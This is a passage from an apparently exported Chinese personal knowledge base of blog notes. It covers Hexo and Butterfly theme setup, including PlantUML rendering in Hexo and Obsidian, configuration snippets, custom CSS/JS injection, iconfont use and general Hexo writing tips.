<p>也正是因为追求这种统一，我才会 <em>忌讳</em> 使用所谓 Hexo 特有的<strong>标签语法</strong>[^tags]，导致很多功能的实现都有所限制。以下小节将针对这种<strong>一致性</strong>进行努力探索。</p>
<p>[^tags]: <a href="https://hexo.io/zh-cn/docs/tag-plugins">标签插件（Tag Plugins） | Hexo</a>。搞笑的是，我发现 <a href="https://github.com/bmwant/hexo-post-link">部分插件开发者</a> 称其为「Ugly」的 😂</p>
<h2>Hexo 对于 Obsidian Flavored Markdown 的渲染</h2>
<p>如果想将 OFM 运用于 Hexo 中，提示文本丰富性，那么可以试试这篇文章：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a></p>
<h2>Plant UML 支持</h2>
<h3>安装与使用</h3>
<p>语法：</p>
<pre><code>```plantuml
@startuml
Bob -&gt; Alice : hello
Alice -&gt; Wonderland: hello
Wonderland -&gt; next: hello
next -&gt; Last: hello
Last -&gt; next: hello
next -&gt; Wonderland : hello
Wonderland -&gt; Alice : hello
Alice -&gt; Bob: hello
@enduml
```
</code></pre>
<pre><code class="language-plantuml">@startuml
Bob -&gt; Alice : hello
Alice -&gt; Wonderland: hello
Wonderland -&gt; next: hello
next -&gt; Last: hello
Last -&gt; next: hello
next -&gt; Wonderland : hello
Wonderland -&gt; Alice : hello
Alice -&gt; Bob: hello
@enduml
</code></pre>
<p>两端端各自插件实现：</p>
<ul>
<li>Obsidian：在第三方插件市场搜索 PlantUML，项目地址 <a href="https://github.com/joethei/obsidian-plantuml">joethei/obsidian-plantuml: Generate PlantUML Diagrams inside Obsidian.md (github.com)</a></li>
<li>Hexo：下载第三方插件 <a href="https://github.com/miao1007/hexo-filter-plantuml">miao1007/hexo-filter-plantuml: Using PlantUML to generate UML Diagram for hexo (github.com)</a></li>
</ul>
<p>两端插件的部分不同之处：</p>
<table>
<thead>
<tr>
<th></th>
<th>Obsidian</th>
<th>Hexo</th>
</tr>
</thead>
<tbody>
<tr>
<td>语法使用</td>
<td>只支持 Markdown 的代码语法块</td>
<td>支持 Markdown 语法块外还支持标签语法</td>
</tr>
<tr>
<td>PlantUML</td>
<td>不一定需要 <code>@startuml</code> 括住内容</td>
<td>必须使用 <code>@startuml</code></td>
</tr>
</tbody>
</table>
<h3>本地部署</h3>
<p>使用 Hexo 插件 <code>miao1007/hexo-filter-plantuml</code> 需注意，当安装该插件并不做任何配置时，插件需要联网使用 PlantUML 接口，且并不是所有国内的 IP 地址都能成功访问这个接口，这就导致了平时 Hexo 本地部署调试时会出错。</p>
<p>错误例子如：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E9%83%A8%E7%BD%B2%E5%A4%B1%E8%B4%A56546565132.webp" alt="部署失败6546565132.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230910155117.webp" alt="image.png"></p>
<p>我的解决方法是将 Plantuml 部署在本地。具体本地部署 Plantuml 的方法详见：<a href="#4272386753" title="本地部署 PlantUML" class="record-link ">本地部署 PlantUML</a></p>
<blockquote>
<p>[!warning] 注意<br>
本地使用 PlantUML 的效率相较于使用服务器 API 的效率低</p>
</blockquote>
<p>如果选择了本地部署，记得在配置文件 <code>_config.yml</code> 中新增：</p>
<pre><code class="language-yaml">plantuml:
	# Local or PlantUMLServer.
	render: &quot;Local&quot;

	# &quot;inline&quot;: &lt;svg&gt;xxx&lt;svg/&gt;
	# &quot;inlineUrlEncode&quot;: &lt;img src='data:image/svg+xml;&gt;
	# &quot;inlineBase64&quot;: &lt;img src='data:image/svg+xml;base64&gt;
	# &quot;localLink&quot;: &lt;img src=&quot;/assert/puml/xxxx.svg&quot;&gt;
	link: &quot;inline&quot;

	# where your dot binary
	# GraphvizDotFile: &quot;/usr/local/bin/dot&quot;  # 不需要此项配置
	# where your jar
	PlantJar: &quot;你的plantuml.jar&quot; 路径

	# common options: svg/png
	outputFormat: &quot;svg&quot;

	# class-name for element style. The default style is center-aligned block
	className: &quot;plantuml&quot;
</code></pre>
<p>Obsidian 插件 <code>joethei/obsidian-plantuml</code> 使用本地 jar 包配置方法：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230910153438.webp" alt="image.png"></p>
<h3>找不到 dot 执行文件</h3>
<p>如果你使用了一些特殊语法，可能会报找不到 dot 的错误。</p>
<p>关于这一点报错我没有深究。只是把两个插件渲染从本地替换为 PlantUML Server。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://juejin.cn/post/7120189614660255781">Hexo + Obsidian + Git 完美的博客部署与编辑方案 - 掘金 (juejin.cn)</a></li>
</ul>
<ul>
<li><a href="http://ruanyifeng.com/blog/2016/10/npm_scripts.html">ruanyifeng.com/blog/2016/10/npm_scripts.html</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="3569112562">
                            <a href="#3569112562">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客适配 Obsidian 新语法</span>
                                
                                <div class="record-links-context hover">
                                    <p>如果想将 OFM 运用于 Hexo 中，提示文本丰富性，那么可以试试这篇文章：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3992879191">
                            <a href="#3992879191">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>PicGo(app) 配置腾讯云 COS 图床</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^图床配置教程]: <a href="#3992879191" title="PicGo(app) 配置腾讯云 COS 图床" class="record-link highlight">PicGo(app) 配置腾讯云 COS 图床</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="4272386753">
                            <a href="#4272386753">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>本地部署 PlantUML</span>
                                
                                <div class="record-links-context hover">
                                    <p>我的解决方法是将 Plantuml 部署在本地。具体本地部署 Plantuml 的方法详见：<a href="#4272386753" title="本地部署 PlantUML" class="record-link highlight">本地部署 PlantUML</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="414962704">
                            <a href="#414962704">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客的写作与装饰</span>
                                
                                <div class="record-links-context hover">
                                    <p>我的工作流：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link ">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a>、<a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link highlight">构建 Obsidian 的 Hexo 写作工作流</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3992879191">
                            <a href="#3992879191">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>PicGo(app) 配置腾讯云 COS 图床</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^osd]: <a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link highlight">构建 Obsidian 的 Hexo 写作工作流</a></p>
<h1>安装 PicGo（App）</h1>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1982369523">
                            <a href="#1982369523">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>双链渲染测试</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a></li>
<li><a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link highlight">构建 Obsidian 的 Hexo 写作工作流</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="746142122">
                            <a href="#746142122">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>第一次写 Hexo 插件</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link highlight">构建 Obsidian 的 Hexo 写作工作流</a></li>
<li><a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1215492985" class="record">
            <header>
                <h1 class="record-title">装点你的 Butterfly 博客</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Butterfly');">Butterfly</button>
                    
                    <button class="btn" onclick="activeTag('CSS');">CSS</button>
                    
                    <button class="btn" onclick="activeTag('HTML');">HTML</button>
                    
                    <button class="btn" onclick="activeTag('Javascript');">Javascript</button>
                    
                    <button class="btn" onclick="activeTag('RSS');">RSS</button>
                    
                    <button class="btn" onclick="activeTag('Waline');">Waline</button>
                    
                    <button class="btn" onclick="activeTag('iconfont');">iconfont</button>
                    
                    <button class="btn" onclick="activeTag('NPM');">NPM</button>
                    
                    <button class="btn" onclick="activeTag('Codepen');">Codepen</button>
                    
                    <button class="btn" onclick="activeTag('SQLite');">SQLite</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>6/2/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/butterflybeautifycover.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>既然选择了 Butterfly 主题，那就好好装点一下吧</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>4872f379</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!Example] 这也许是一篇索引文章<br>
温馨提示，文章包含大量站内站外链接，建议加入收藏夹/集锦以备不时之需。</p>
</blockquote>
<p>本文由原 <a href="#414962704" title="Hexo 博客的写作与装饰" class="record-link ">Hexo 博客的写作与装饰</a> 拆分而来。</p>
<h1>主题升级</h1>
<p>主题文件夹拉取最新分支即可。注意查看更新日志以调整主题配置文件。</p>
<pre><code class="language-sh">git pull origin master
</code></pre>
<p>如果有魔改的自己注意合并一下。</p>
<p>参考：<a href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安裝文檔(一) 快速開始 | Butterfly</a></p>
<h1>评论系统的部署</h1>
<p><a href="#1495212389" title="Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问" class="record-link ">Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</a></p>
<h1>搜索</h1>
<blockquote>
<p>[!warning] 来自站长的教训<br>
使用 Algolia 搜索默认主题时，注意搜索界面不要有跳转到外国网站的链接（比如 power by 的 logo），否则可能会有 wxb 来电风险。参考 <a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link ">Hexo 博客与 Waline 评论区实现外链跳转中间页</a>。</p>
</blockquote>
<ul>
<li><a href="https://blog.jersite.gq/post/3cafefd4.html">Algolia 在线搜索使用 | Jer's blog (jersite.gq)</a></li>
<li><a href="https://butterfly.js.org/posts/ceeb73f/#%E6%90%9C%E7%B4%A2">Butterfly 安裝文檔(四) 主題配置-2 | Butterfly</a></li>
<li><a href="https://github.com/LouisBarranqueiro/hexo-algoliasearch">LouisBarranqueiro/hexo-algoliasearch: A plugin to index posts of your Hexo blog on Algolia (github.com)</a></li>
</ul>
<h1>各平台站长管理工具配置</h1>
<p><a href="https://cloud.tencent.com/developer/article/2023058">hexo-butterfly-数据统计相关引入 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<h1>优雅改</h1>
<p>我定义的优雅改是指仅在主题配置文件 <code>inject</code> 处添加自定义 css 和 js 文件，不修改主题源码。</p>
<h2>Hexo 博客添加自定义 css 和 js 文件方法</h2>
<ol>
<li>打开主题配置文件（butterfly.yml）</li>
<li>定位搜索 inject</li>
<li>其中 head 是用来引入 css 的。bottom 是用来引入 js 的。（有时候也没有那么严格区分）</li>
</ol>
<p>示例</p>
<pre><code class="language-yaml">inject:
  head:
    - &lt;link rel=&quot;stylesheet&quot; href=&quot;your css&quot;&gt;
  bottom:
    - &lt;script src=&quot;your js&quot;&gt;&lt;/script&gt;
</code></pre>
<p>参考：<a href="https://blog.leonus.cn/2022/custom.html">Hexo 博客添加自定义 css 和 js 文件 | Leonus</a></p>
<h2>使用 iconfont 图标库</h2>
<p>使用之前首先阅读官方说明：<a href="https://butterfly.js.org/posts/4073eda/#iconfont">Butterfly 安裝文檔(六) 進階教程 | Butterfly</a></p>
<p>然后参考这篇文章：<a href="https://www.antmoe.com/posts/80c43671/index.html">Hexo 博客之优雅使用阿里 iconfont 图标 | 小康博客 (antmoe.com)</a></p>
<p>其实可以像我这样实践，我觉得这样更方便：</p>
<pre><code class="language-yaml">inject:
  head:
    # iconfont
    # 放iconfont自己项目的链接，注意，每次iconfont中的项目更新后，连接就会不一样
    - &lt;link rel=&quot;stylesheet&quot; href=&quot;//at.alicdn.com/t/c/yourcsslink.css&quot;&gt;
    # 放自己额外定义的css
    - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/iconfont_custom.css&quot;&gt;
</code></pre>
<p>当然也可以把图标下载到本地，方法：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230427194929460.png" alt="image-20230427194929460"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230427195048627.png" alt="image-20230427195048627|450"></p>
<h2>其他优雅改</h2>
<blockquote>
<p>[!success] 以下文章均已收录至 <a href="https://butterfly.zhheo.com/">Butterfly 主题美化教程</a></p>
</blockquote>
<p>自定义侧边栏：<a href="#90746120" title="Butterfly 不改动主题源码实现自定义侧边栏" class="record-link ">Butterfly 不改动主题源码实现自定义侧边栏</a></p>
<p>自定义页脚：<a href="#152796589" title="Butterfly 自定义页脚（不修改主题源码）" class="record-link ">Butterfly 自定义页脚（不修改主题源码）</a></p>
<p>夜间模式更改网站图标：<a href="#4033695206" title="Butterfly 夜间模式变换顶部网站图标" class="record-link ">Butterfly 夜间模式变换顶部网站图标</a></p>
<h2>Butterfly 问题解决</h2>
<h3>BtterFly 主题不显示封面？</h3>
<p>确保主题配置文件中 cover 的相关配置已经配置正确。</p>
<h3>配置好了但某些文章不显示默认封面？</h3>
<p>如果某些文章没有显示默认封面，试试在 Front-matter 加上 description 字段。</p>
<h1>仅供参考的条目</h1>
<p>以下条目将不再维护，仅供历史参考。</p>
<h2>自定义滚动条</h2>
<blockquote>
<p>[!fail] 新版本 Butterfly 好像不起作用了</p>
</blockquote>
<p>引入新的 css 文件，文件内容为：</p>
<pre><code class="language-css">/* 滚动条 */
::-webkit-scrollbar {
	width: 15px;        /* 滚动条的宽度 */
	height: 8px;
}

::-webkit-scrollbar-track {
	background-color: rgba(73, 177, 245, 0.2);
	border-radius: 2em;
}

::-webkit-scrollbar-thumb {
	background-color: #49b1f5;
	background-image: -webkit-linear-gradient(
	  45deg,
	  rgba(255, 255, 255, 0.4) 25%,
	  transparent 25%,
	  transparent 50%,
	  rgba(255, 255, 255, 0.4) 50%,
	  rgba(255, 255, 255, 0.4) 75%,
	  transparent 75%,
	  transparent
	);
	border-radius: 2em;
}

::-webkit-scrollbar-corner {
	background-color: transparent;
}

::-moz-selection {
	color: #fff;
	background-color: #49b1f5;
}
</code></pre>
<p>参考：<a href="https://www.cnblogs.com/antmoe/p/12846393.html">Hexo 博客之 butterfly 主题优雅魔改系列（持续更新） - antmoe - 博客园 (cnblogs.com)</a></p>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">6</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="90746120">
                            <a href="#90746120">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Butterfly 不改动主题源码实现自定义侧边栏</span>
                                
                                <div class="record-links-context hover">
                                    <p>自定义侧边栏：<a href="#90746120" title="Butterfly 不改动主题源码实现自定义侧边栏" class="record-link highlight">Butterfly 不改动主题源码实现自定义侧边栏</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="152796589">
                            <a href="#152796589">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Butterfly 自定义页脚（不修改主题源码）</span>
                                
                                <div class="record-links-context hover">
                                    <p>自定义页脚：<a href="#152796589" title="Butterfly 自定义页脚（不修改主题源码）" class="record-link highlight">Butterfly 自定义页脚（不修改主题源码）</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="414962704">
                            <a href="#414962704">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客的写作与装饰</span>
                                
                                <div class="record-links-context hover">
                                    <p>本文由原 <a href="#414962704" title="Hexo 博客的写作与装饰" class="record-link highlight">Hexo 博客的写作与装饰</a> 拆分而来。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1495212389">
                            <a href="#1495212389">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</span>
                                
                                <div class="record-links-context hover">
                                    <p><a href="#1495212389" title="Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问" class="record-link highlight">Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3790495434">
                            <a href="#3790495434">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客与 Waline 评论区实现外链跳转中间页</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!warning] 来自站长的教训<br>
使用 Algolia 搜索默认主题时，注意搜索界面不要有跳转到外国网站的链接（比如 power by 的 logo），否则可能会有 wxb 来电风险。参考 <a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link highlight">Hexo 博客与 Waline 评论区实现外链跳转中间页</a>。</p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="4033695206">
                            <a href="#4033695206">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Butterfly 夜间模式变换顶部网站图标</span>
                                
                                <div class="record-links-context hover">
                                    <p>夜间模式更改网站图标：<a href="#4033695206" title="Butterfly 夜间模式变换顶部网站图标" class="record-link highlight">Butterfly 夜间模式变换顶部网站图标</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="414962704">
                            <a href="#414962704">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客的写作与装饰</span>
                                
                                <div class="record-links-context hover">
                                    <p>详见文章：<a href="#1215492985" title="装点你的 Butterfly 博客" class="record-link highlight">装点你的 Butterfly 博客</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2065118013">
                            <a href="#2065118013">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>国内访问 Hexo 优化加速（CDN链接替换）</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^hb]: fontawesome 可以考虑更换图标库，请看我之前的文章 <a href="#1215492985" title="装点你的 Butterfly 博客" class="record-link highlight">装点你的 Butterfly 博客</a><br>
[^bw]: 处理这个问题前请看我之前的文章：<a href="#1495212389" title="Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问" class="record-link ">Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="414962704" class="record">
            <header>
                <h1 class="record-title">Hexo 博客的写作与装饰</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Butterfly');">Butterfly</button>
                    
                    <button class="btn" onclick="activeTag('Nginx');">Nginx</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>6/2/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/hexobutifycover.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>部署完 Hexo，选择一个好的主题进行更加个性化的定制。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>18bbd410</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!Example] 这也许是一篇索引文章<br>
温馨提示，文章包含大量站内站外链接，建议加入收藏夹/集锦以备不时之需。</p>
</blockquote>
<h1>Hexo 博客基本使用</h1>
<p>请认真研读 <a href="https://hexo.io/zh-cn/docs/">官方文档 | Hexo</a></p>
<p>默认网站图标位置：<code>&lt;Hexo根目录&gt;\themes\&lt;主题名字&gt;\source\img\favicon.png</code></p>
<p>文章永久连接配置：<a href="https://imbhj.com/b6a99401/">Hexo 博客生成永久链接 | Ordis'Blog (imbhj.com)</a></p>
<blockquote>
<p>[!Warning] 建议<br>
强烈建议您马上更改 Hexo 默认的永久链接，否则链接过长会导致一些奇奇怪怪的错误（<a href="https://github.com/overtrue/share.js/issues/127">代码长度溢出 · Issue #127 · overtrue/share.js (github.com)</a>）</p>
</blockquote>
<p>插件地址与使用说明：<a href="https://github.com/Rozbo/hexo-abbrlink">rozbo/hexo-abbrlink: create one and only link for every post for hexo (github.com)</a></p>
<h2>工作流</h2>
<p>我的工作流：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link ">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a>、<a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link ">构建 Obsidian 的 Hexo 写作工作流</a></p>
<p>其他：<a href="https://github.com/lxl80/hexo-deployer-cos-cdn">lxl80/hexo-deployer-cos-cdn: Hexo部署插件，支持将静态博客发布到腾讯云对象存储中，并同步刷新被更新文件的CDN缓存。 (github.com)</a></p>
<h2>404 页面配置</h2>
<p>在 Hexo 项目 Sourse 文件夹下创建 <a href="http://404.md">404.md</a>，编辑这个页面创建自己想要的 404 页。</p>
<p>修改 Nginx 配置。在服务武器编辑配置文件：</p>
<pre><code class="language-sh">vim /etc/nginx/conf.d/default.conf
</code></pre>
<p>把这行取消注释：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230414144414596.png" alt="image-20230414144414596|500"></p>
<p>保存后重启 Nginx 即可。</p>
<h2>使用 Hexo 写作注意</h2>
<p><strong>tag 后的冒号记得加空格</strong>（参考：<a href="https://www.cnblogs.com/tiankx/p/13889074.html">can not read a block mapping entry</a>）</p>
<p>不要在标题开头用 <code>[内容]</code>、在内容里 <code>#</code> 不要与 <code>{</code> 紧挨着：比如 <code>[长文预警]JMeter的安装与使用＆实验中有用的提示（for TJUers）</code></p>
<p>这种标题容易报错，报的还是 tag 的错：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230409165141489.png" alt="image-20230409165141489"></p>
<p>详见：<a href="https://www.jianshu.com/p/1d91c507c1dd">Hexo 踩坑 - 简书 (jianshu.com)</a></p>
<h2>插件推荐</h2>
<h3>功能类</h3>
<ul>
<li>RSS 订阅：<a href="https://dclef.icu/2022/09/24/%E5%9C%A8butterfly%E4%B8%BB%E9%A2%98%E4%B8%AD%E6%B7%BB%E5%8A%A0rss%E8%AE%A2%E9%98%85/">在 butterfly 主题中添加 rss 订阅 | 老猫的博客 (dclef.icu)</a></li>
<li>自动添加分类：<a href="https://github.com/xu-song/hexo-auto-category">xu-song/hexo-auto-category: Generate categories automatically for each post in Hexo (github.com)</a></li>
<li>自动统一 tag：<a href="https://github.com/dailyrandomphoto/hexo-easy-tags-plugin">dailyrandomphoto/hexo-easy-tags-plugin: A Hexo plugin that automatically corrects tag names. (github.com)</a></li>
</ul>
<h3>装饰类</h3>
<ul>
<li>主页的分类/标签磁贴：<a href="https://github.com/Zfour/hexo-magnet">Zfour/hexo-magnet: 基于hexo的magnet插件 (github.com)</a></li>
</ul>
<h2>解锁更多玩法</h2>
<p>换更高级的渲染器：<a href="https://zsyyblog.com/b73ceb85.html">Hexo 多种 Markdown 渲染器对比分析 | 竹山一叶 (zsyyblog.com)</a></p>
<p>部署友链朋友圈：<a href="#2966071784" title="server、sqlite 朋友圈部署方案" class="record-link ">server、sqlite 朋友圈部署方案</a></p>
<p>随机访问一篇文章：<a href="https://blog.leonus.cn/2022/randomPost.html">随机访问一篇文章的实现 | Leonus</a></p>
<p>漂浮物的显示：<a href="#681885666" title="Hexo 博客添加漂浮物效果（可定制显示页面）" class="record-link ">Hexo 博客添加漂浮物效果（可定制显示页面）</a></p>
<p>生成 AI 摘要（付费）：</p>
<ul>
<li><a href="https://blog.zhheo.com/p/ec57d8b2.html">如何让博客支持 AI 摘要，使用 TianliGPT 自动生成文章的 AI 摘要 | 张洪 Heo</a></li>
<li><a href="https://github.com/qxchuckle/Post-Summary-AI">qxchuckle/Post-Summary-AI: 一个较通用的，生成网站内文章摘要，并推荐相关文章的AI (github.com)</a></li>
</ul>
<p>加入进度条：<a href="#1308325830" title="在你的 Hexo 博客上加入进度条" class="record-link ">在你的 Hexo 博客上加入进度条</a></p>
<h1>BtterFly 主题相关</h1>
<p>详见文章：<a href="#1215492985" title="装点你的 Butterfly 博客" class="record-link ">装点你的 Butterfly 博客</a></p>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">6</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="85495977">
                            <a href="#85495977">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>构建 Obsidian 的 Hexo 写作工作流</span>
                                
                                <div class="record-links-context hover">
                                    <p>我的工作流：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link ">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a>、<a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link highlight">构建 Obsidian 的 Hexo 写作工作流</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="681885666">
                            <a href="#681885666">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客添加漂浮物效果（可定制显示页面）</span>
                                
                                <div class="record-links-context hover">
                                    <p>漂浮物的显示：<a href="#681885666" title="Hexo 博客添加漂浮物效果（可定制显示页面）" class="record-link highlight">Hexo 博客添加漂浮物效果（可定制显示页面）</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1215492985">
                            <a href="#1215492985">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>装点你的 Butterfly 博客</span>
                                
                                <div class="record-links-context hover">
                                    <p>详见文章：<a href="#1215492985" title="装点你的 Butterfly 博客" class="record-link highlight">装点你的 Butterfly 博客</a></p>

                                </div>
                                
                            </a>
